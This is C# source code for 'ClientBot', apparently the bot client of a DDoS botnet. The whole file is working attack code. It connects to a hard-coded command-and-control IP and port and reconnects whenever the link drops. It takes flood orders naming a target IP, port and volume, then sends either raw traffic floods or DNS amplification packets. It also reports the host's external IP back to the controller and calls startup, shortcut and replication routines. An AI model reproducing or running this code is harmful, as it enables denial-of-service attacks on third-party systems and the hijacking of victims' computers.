using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Client;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;


namespace ClientBot
{
    class Client
    {
        
        static IPAddress host = IPAddress.Parse("142.129.157.81");
        static int port = 22580;
        static IPAddress client;
        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static TcpClient hostServer = new TcpClient();
        static List<Thread> threadList = new List<Thread>();
        static List<Task> taskList = new List<Task>();
        static bool kill = false;
        static string[] a;
        static string[] command;
        static Thread listn;
        public static State clientState;
        IPv4InterfaceStatistics interfaceStats = null;
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        static void Main(string[] args)
        {
            IntPtr hWnd = GetConsoleWindow();
            //ShowWindow(hWnd, 1);
            Console.ForegroundColor = ConsoleColor.White;
            if (ClientBot.Initializer.startUp() == true&&ClientBot.Initializer.shortcut()==true)
            {
               Console.Write(getTime()+"IP " + getIP());
                Initializer.replicate();
                client = getIP();
                Logger.Initialize();
                //ClientBot.SEND.dnsAmplifcation();
                Connect();
            }
        }
        static void Connect()
        {
            
            try
            {
                hostServer.Connect(host, port);
                Console.WriteLine(getTime()+" it worked ");
                Thread ListenThread = new Thread(() => L());
                listn = ListenThread;
                threadList.Add(ListenThread);
                ListenThread.Start();
               // Thread readThread = new Thread(() => read());
              //  threadList.Add(readThread);
              //  readThread.Start();
                
                
            }
            catch(SocketException e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(getTime() + "Error: " + e.ToString());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(getTime() + "reconnecting in 10 seconds");
                Thread.Sleep(10000);
                Connect();
            }
           

        }
        //public static void Listen()
        //{
        //    try
        //    {
        //        Console.WriteLine(getTime()+"Listen Started");
        //        int i = 0;
        //        char[] delimiter = { '$',' '};
        //        byte[] data = new byte[1024];
        //        NetworkStream stream = hostServer.GetStream();
        //        int recievedData = stream.Read(data, 0, data.Length);
        //        string StrData = Encoding.ASCII.GetString(data, 0, recievedData);
        //        string[] info = StrData.Split(delimiter);
        //        IPAddress sentIP = IPAddress.Parse(info[0]);
        //        int sentPort = int.Parse(info[1]);
        //        int sentData = int.Parse(info[2]);
        //        bool dnsAMP = bool.Parse(info[3]);
        //        setPreviousCommand(info);
        //        info = null;
        //        Console.WriteLine(getTime()+StrData);
        //        sendSpeed();
        //        clientState = State.CLIENT_SEND;
        //        Console.WriteLine(getTime()+"sending now");
        //        sendState(clientState);
        //        Send(sentIP, sentPort, sentData,dnsAMP);
        //    }
        //    catch(Exception e)
        //    {
        //        Console.WriteLine(getTime() + "shit happens " + e);
        //        if (e is System.FormatException)
        //        {
        //            Listen();
        //        }
        //        else
        //        { 
        //           // Restart();
        //        }
                
        //    }
        //}
        public static void L()
        {
            try
            {
                while (!kill)
                {
                    if (!hostServer.Connected)
                    {
                        throw new Exception("Connection lost");
                    }
                    Console.WriteLine(getTime() + "reading startedd");
                    string commandStop = Command.STOP.ToString();
                    string commandPause = Command.PAUSE.ToString();
                    string commandStart = Command.START.ToString();
                    string ret = string.Empty;
                    NetworkStream stream = hostServer.GetStream();
                    byte[] data = new byte[1024];
                    int receivedData = stream.Read(data, 0, data.Length);
                    ret = Encoding.ASCII.GetString(data, 0, receivedData);

                    if (ret.Equals(Command.STOP.ToString()))
                    {
                        if (clientState != State.CLIENT_STOP)
                        {
                            Console.WriteLine("\n" + getTime() + "Command received " + ret);
                            clientState = State.CLIENT_STOP;
                            sendState(clientState);
                            Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
                            L();
                        }
                    }
                    else if (ret.Equals(Command.PAUSE.ToString()))
                    {
                        if (clientState != State.CLIENT_PAUSE)
                        {
                            Console.WriteLine(getTime() + "Command received " + ret);
                            clientState = State.CLIENT_PAUSE;
                            sendState(clientState);
                        }
                    }
                    else if (ret.Equals(Command.START.ToString()) && clientState == State.CLIENT_STOP)
                    {
                        if (clientState != State.CLIENT_SEND)
                        {
                            Console.WriteLine(getTime() + "Command received " + ret);
                            clientState = State.CLIENT_SEND;
                            Console.WriteLine(getTime() + "Starting Listen");
                            sendState(clientState);
                            Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
                            //Listen();
                        }
                    }
                    else if (ret.Equals(Command.RESUME.ToString()))
                    {
                        if (clientState != State.CLIENT_NULL)
                        {
                            
                                clientState = State.CLIENT_SEND;
                                sendState(clientState);
                                Console.WriteLine(getTime() + "Command received" + ret);
                                foreach (string a in command)
                                {
                                    Console.WriteLine(a + " ");
                                }
                                IPAddress sentIP = IPAddress.Parse(command[0]);
                                int sentPort = int.Parse(command[1]);
                                int sentData = int.Parse(command[2]);
                                bool sentDNS = bool.Parse(command[3]);
                                Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
                                Send(sentIP, sentPort, sentData, sentDNS);
                           
                        }
                    }
                    else if (ret.Equals(Command.KILL.ToString()))
                    {
                        Console.WriteLine(getTime() + "Exiting");
                        Thread.Sleep(10000);
                        KillApp();
                    }
                    else
                    {
                        Console.WriteLine(getTime() + "IDK WHAT TO DO" + ret);
                        if (ret.Contains("$"))
                        {
                            string[] info = ret.Split('$');
                            IPAddress sentIP = IPAddress.Parse(info[0]);
                            int sentPort = int.Parse(info[1]);
                            int sentData = int.Parse(info[2]);
                            bool dnsAMP = bool.Parse(info[3]);
                            setPreviousCommand(info);
                            sendSpeed();
                            clientState = State.CLIENT_SEND;
                            Console.WriteLine(getTime() + "sending now");
                            Thread send = new Thread(()=>Send(sentIP, sentPort, sentData, dnsAMP));
                            threadList.Add(send);
                            send.Start();
                        }
                        else
                        {
                            Thread.Sleep(1000);
                            L();
                        }
                    }
                }
            }
            catch(Exception e)
            {
                Restart();
            }
        }
        static void task()
        {
            ///not used currently
            Console.WriteLine(getTime()+"task called");
            L();
            Task.Run(() =>
            {
                
                    L();
                    Task.WaitAll();
                    
            });
        }
        static void Send(IPAddress ip,int port, int dataAmount,bool dnsAMP)
        {
            Task.Run(() =>
            {

                //L();
                Task.WaitAll();

            });
            //Thread readT = new Thread(() => read());
            //threadList.Add(readT);
            //readT.Start();
            try
            {
                
                if (!dnsAMP)
                {
                    int i = 0;
                    while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
                    {
                        if (hostServer.Connected)
                        {
                            if (clientState == State.CLIENT_SEND)
                            {
                                i++;
                                Console.Write("\r{0}" + clientState + " Sending iteration:{1} ", getTime(), i);
                                ///Console.Write("\r " + clientState);
                            }
                            else if (clientState == State.CLIENT_STOP)
                            {
                                Console.WriteLine(getTime() + "Breaking Out");
                                break;
                            }
                            else if (clientState == State.CLIENT_PAUSE)
                            {
                                Console.WriteLine(getTime() + "Pause Command Received");
                                break;
                            }
                        }
                        else
                        {
                            break;
                            throw new Exception("Host Disconnected");
                        }
                    }
                }
                else if(dnsAMP)
                {
                    int i = 0;
                    PcapDotNet.Packets.Packet packet = ClientBot.SEND.dnsAmplifcation(ip.ToString(), "");
                    IList<PcapDotNet.Core.LivePacketDevice> packetDevices = PcapDotNet.Core.LivePacketDevice.AllLocalMachine;
                    PcapDotNet.Core.PacketDevice packetDevice = packetDevices[0];
                    while (ClientBot.SEND.dns(packet,packetDevice))
                    {
                        if (hostServer.Connected)
                        {
                            if (clientState == State.CLIENT_SEND)
                            {
                                i++;
                                Console.Write("\r {0}" + clientState + "Sending iteration:{1} ", getTime(), i);
                                //Console.Write("\r " + clientState);
                            }
                            else if (clientState == State.CLIENT_STOP)
                            {
                                Console.WriteLine(getTime() + "Breaking Out");
                                break;
                            }
                            else if (clientState == State.CLIENT_PAUSE)
                            {
                                Console.WriteLine(getTime() + "Pause Command Received");
                                break;
                            }
                        }
                        else
                        {
                            break;
                            throw new Exception("Host disconnected");
                        }
                    }

                }
                //task();
                
            }
            catch (Exception e)
            {
                Console.WriteLine(getTime() + "shit happens " + e);
               // Restart();

            }

        }
        //static async void read()
        //{
        //    try
        //    {
        //        await Task.Run(() =>
        //        {
        //            while (!kill)
        //            {
        //                if(!hostServer.Connected)
        //                {
        //                    throw new Exception("Connection lost");
        //                }
        //                Console.WriteLine(getTime()+"reading startedd");
        //                string commandStop = Command.STOP.ToString();
        //                string commandPause = Command.PAUSE.ToString();
        //                string commandStart = Command.START.ToString();
        //                string ret = string.Empty;
        //                NetworkStream stream = hostServer.GetStream();
        //                byte[] data = new byte[1024];
        //                int receivedData = stream.Read(data, 0, data.Length);
        //                ret = Encoding.ASCII.GetString(data, 0, receivedData);

        //                if (ret.Equals(Command.STOP.ToString()))
        //                {
        //                    if (clientState != State.CLIENT_STOP)
        //                    {
        //                        Console.WriteLine("\n" + getTime() + "Command received " + ret);
        //                        clientState = State.CLIENT_STOP;
        //                        sendState(clientState);
        //                        Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
        //                        Listen();
        //                    }
        //                }
        //                else if (ret.Equals(Command.PAUSE.ToString()))
        //                {
        //                    if (clientState != State.CLIENT_PAUSE)
        //                    {
        //                        Console.WriteLine(getTime() + "Command received " + ret);
        //                        clientState = State.CLIENT_PAUSE;
        //                        sendState(clientState);
        //                    }
        //                }
        //                else if (ret.Equals(Command.START.ToString())&&clientState==State.CLIENT_STOP)
        //                {
        //                    if (clientState != State.CLIENT_SEND)
        //                    {
        //                        Console.WriteLine(getTime() + "Command received " + ret);
        //                        clientState = State.CLIENT_SEND;
        //                        Console.WriteLine(getTime() + "Starting Listen");
        //                        sendState(clientState);
        //                        Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
        //                        //Listen();
        //                    }
        //                }
        //                else if (ret.Equals(Command.RESUME.ToString()))
        //                {
        //                    if (clientState != State.CLIENT_NULL)
        //                    {
        //                        try
        //                        {
        //                            clientState = State.CLIENT_SEND;
        //                            sendState(clientState);
        //                            Console.WriteLine(getTime() + "Command received" + ret);
        //                            foreach (string a in command)
        //                            {
        //                                Console.WriteLine(a + " ");
        //                            }
        //                            IPAddress sentIP = IPAddress.Parse(command[0]);
        //                            int sentPort = int.Parse(command[1]);
        //                            int sentData = int.Parse(command[2]);
        //                            bool sentDNS = bool.Parse(command[3]);
        //                            Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
        //                            Send(sentIP, sentPort, sentData, sentDNS);
        //                        }
        //                        catch (Exception e)
        //                        {
        //                            Console.WriteLine(getTime() + "Resume error" + e);
        //                            Restart();
        //                        }
        //                    }
        //                }
        //                else if (ret.Equals(Command.KILL.ToString()))
        //                {
        //                    Console.WriteLine(getTime()+"Exiting");
        //                    Thread.Sleep(10000);
        //                    KillApp();
        //                }
        //                else
        //                {
        //                    Console.WriteLine(getTime()+"IDK WHAT TO DO"+ret);
        //                    if (ret.Contains("$"))
        //                    {
        //                        string[] info = ret.Split('$');
        //                        IPAddress sentIP = IPAddress.Parse(info[0]);
        //                        int sentPort = int.Parse(info[1]);
        //                        int sentData = int.Parse(info[2]);
        //                        bool dnsAMP = bool.Parse(info[3]);
        //                        setPreviousCommand(info);
        //                        sendSpeed();
        //                        clientState = State.CLIENT_SEND;
        //                        Console.WriteLine(getTime() + "sending now");
        //                        Send(sentIP, sentPort, sentData, dnsAMP);
        //                    }
        //                    else
        //                    {
        //                        Thread.Sleep(1000);
        //                        read();
        //                    }
        //                }
        //            }
        //        });
        //    }
        //    catch(Exception e)
        //    {
        //        Console.WriteLine(getTime()+"error " + e);
        //        Restart();
        //    }
        //    //    return ret;
        //}
        static async Task sendState(State state)
        {
            State currentState = state;
            NetworkStream stream = hostServer.GetStream();
            string statement = MessageType.STATE.ToString()+"$"+ getIP() + "$" + currentState.ToString();
            stream.Write(Encoding.ASCII.GetBytes(statement), 0, Encoding.ASCII.GetBytes(statement).Length);
        }
        static void setPreviousCommand(string[] a)
        {

            command = a; 
        }
        static string[] getPreviousCommand()
        {

            return command;
        }
        static void write(string text)
        {

        }
        static IPAddress getIP()
        {
            IPAddress ip;
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                             .Matches(externalIP)[0].ToString();
                ip = IPAddress.Parse(externalIP);
                return ip;
            }
            catch { return null; }


        }
        static double getSpeed()
        {
            double speed = 10;
            /*  Uri URL = new Uri("http://sixhoej.net/speedtest/1024kb.txt");
              WebClient wc = new WebClient();
              double starttime = Environment.TickCount;
              // download file from the specified URL, and save it to C:\speedtest.txt  
              wc.DownloadFile(URL, @"C:\Users\winga\Documents\speedtest.txt");
              // get current tickcount  
              double endtime = Environment.TickCount;
              // how many seconds did it take?  
              // we are calculating this by subtracting starttime from endtime  
              // and dividing by 1000 (since the tickcount is in miliseconds.. 1000 ms = 1 sec)  
              double secs = Math.Floor(endtime - starttime) / 1000;
              // round the number of secs and remove the decimal point  
              double secs2 = Math.Round(secs, 0);
              // calculate download rate in kb per sec.  
              // this is done by dividing 1024 by the number of seconds it  
              // took to download the file (1024 bytes = 1 kilobyte)  
              double kbsec = Math.Round(1024 / secs);
              try
              {
                  // delete downloaded file  
                  System.IO.File.Delete(@"C:\Users\winga\Documents\speedtest.txt");
              }
              catch
              {

              }*/
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            IPGlobalStatistics stats = null;
            stats = properties.GetIPv4GlobalStatistics();
            long sp = stats.ReceivedPacketsDelivered;
            speed = sp;
            return speed;
        }

        public static string getTime()
        {
            string time = "["+DateTime.Now.ToString("hh:mm:ss")+"]: ";
            return time;
        }
        static void sendSpeed()
        {
            NetworkStream stream = hostServer.GetStream();
            string ip = getIP().ToString();
            double speed = getSpeed();
            string toSend = MessageType.SPEED.ToString()+"$"+ ip +"$"+ speed;
            stream.Write(Encoding.ASCII.GetBytes(toSend), 0, Encoding.ASCII.GetBytes(toSend).Length);
        }
        static void KillApp()
        {
            Environment.Exit(0);
        }
        static void Restart()
        {
            Console.WriteLine("Restar Called");
            hostServer = null;
            hostServer = new TcpClient();
            Console.WriteLine("ThreadList Length " + threadList.Count());
            foreach(Thread s in threadList)
            {
                if (s.Equals(listn))
                {
                    Console.WriteLine("helloaa");
                }
                else
                {
                    Console.WriteLine("hello");
                    s.Abort();
                }
            }
            Console.WriteLine("hello");
            threadList.Clear();
            Connect();
        }
        
    } 
    public enum Command
    {
        START,
        PAUSE,
        STOP,
        RESUME,
        KILL
    }
    public enum State
    {
        HOST_DISCONNECT,
        CLIENT_DISCONNECT,
        CLIENT_SEND,
        CLIENT_PAUSE,
        CLIENT_STOP,
        CLIENT_NULL
    }
    public enum MessageType
    {
        STATE,
        SPEED
    }
}

